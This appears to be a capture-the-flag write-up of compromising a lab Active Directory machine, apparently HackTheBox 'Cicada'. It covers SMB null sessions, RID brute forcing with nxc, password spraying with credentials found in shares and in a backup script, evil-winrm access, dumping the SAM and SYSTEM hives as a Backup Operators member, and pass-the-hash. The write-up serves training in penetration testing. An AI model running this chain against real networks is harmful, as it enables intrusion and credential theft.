### NMAP

```bash
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
50593/tcp open  unknown
```

### CONNECTING TO SMB

LISTING THE SHARES WITH NULL SESSION

<img width="1056" height="273" alt="image" src="https://github.com/user-attachments/assets/2df07479-79ac-4dc5-9339-b4bf5884cee7" />


CONNECTING TO THE HR SHARE

<img width="488" height="345" alt="image" src="https://github.com/user-attachments/assets/5cdcbc73-0844-4290-a6b7-07ba60f77e62" />


WE HAVE NOTICE FILE FROM HR AFTER READING THIS WE HAVE.

```bash
Dear new hire!

Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.

Your default password is: Cicada$M6Corpb*@Lp#nZp!8

To change your password:

1. Log in to your Cicada Corp account** using the provided username and the default password mentioned above.
2. Once logged in, navigate to your account settings or profile settings section.
3. Look for the option to change your password. This will be labeled as "Change Password".
4. Follow the prompts to create a new password**. Make sure your new password is strong, containing a mix of uppercase letters, lowercase letters, numbers, and special characters.
5. After changing your password, make sure to save your changes.

Remember, your password is a crucial aspect of keeping your account secure. Please do not share your password with anyone, and ensure you use a complex password.

If you encounter any issues or need assistance with changing your password, don't hesitate to reach out to our support team at support@cicada.htb.

Thank you for your attention to this matter, and once again, welcome to the Cicada Corp team!

Best regards,
Cicada Corp
```

AND WE HAVE A PASSWORD :  Cicada$M6Corpb*@Lp#nZp!8

### ENUMRATING USERS

```bash
nxc smb 10.10.11.35 -u '.' -p '' --rid-brute
```

AND WE HAVE SOME USERS

<img width="1169" height="249" alt="image" src="https://github.com/user-attachments/assets/6fdd02c5-63b9-48d9-a856-5dd0c6b31f92" />


ADDING THIS USERS TO FILE AND ATTEMPTING TO PASSWORD USING THE ABOVE PASSWORD.

<img width="1340" height="117" alt="image" src="https://github.com/user-attachments/assets/749b0f32-c317-4ef5-974b-a6e8d14cf198" />


### MORE ENUM

NOW ENUMERATING MORE USING THE ABOVE CREDS

```bash
SMB         10.10.11.35     445    CICADA-DC        david.orelious                2024-03-14 12:17:29 0       Just in case I forget my password is aRt$Lp#7t*VQ!3
```

NOW CONNECTING TO THE DEV SHARE USING THE ABOVE CREDS

<img width="962" height="147" alt="image" src="https://github.com/user-attachments/assets/89473dff-6783-440f-922c-b390ea1ddb5f" />


WE HAVE A BACKUP SCRIPT.

```bash
$sourceDirectory = "C:\smb"
$destinationDirectory = "D:\Backup"

$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
$backupFileName = "smb_backup_$dateStamp.zip"
$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"

```

WE HAVE SOME MORE CREDS

NOW CONNECTING TO THE MACHINE USING evil-einrm

<img width="1017" height="335" alt="image" src="https://github.com/user-attachments/assets/a421f1ca-a3b5-41b3-94dd-e2970569d5eb" />


### POST EXPLOITATION

WITH THE COMMAND whoami /all

<img width="1731" height="681" alt="image" src="https://github.com/user-attachments/assets/ba15319f-5f53-4ebf-8799-a866cd71353d" />


WE SEE THE USER IS THE MEMBER OF BACKUP OPERATORS

NOW WE WILL GET THE sam and system file and try to crack the hash

<img width="1242" height="161" alt="image" src="https://github.com/user-attachments/assets/e47d01cb-2687-4292-87fb-cb92c55ba60a" />


<img width="927" height="116" alt="image" src="https://github.com/user-attachments/assets/da932e65-d2b1-4142-aa0d-c095b2191aeb" />


SENDING TO MY SMB SERVER

NOW DUMPING THE HASHED USING THE [secretsdump.py](http://secretsdump.py) 

WE GET 

<img width="1251" height="281" alt="image" src="https://github.com/user-attachments/assets/bef6f4e6-e850-4b2c-9951-2f28e887ca04" />

NOW USING THE HASH WE WILL TRY TO LOGIN WITH THE HASHED PASSWORD

<img width="1617" height="703" alt="image" src="https://github.com/user-attachments/assets/f8f04652-79e4-4a4c-ad13-08f46709b660" />
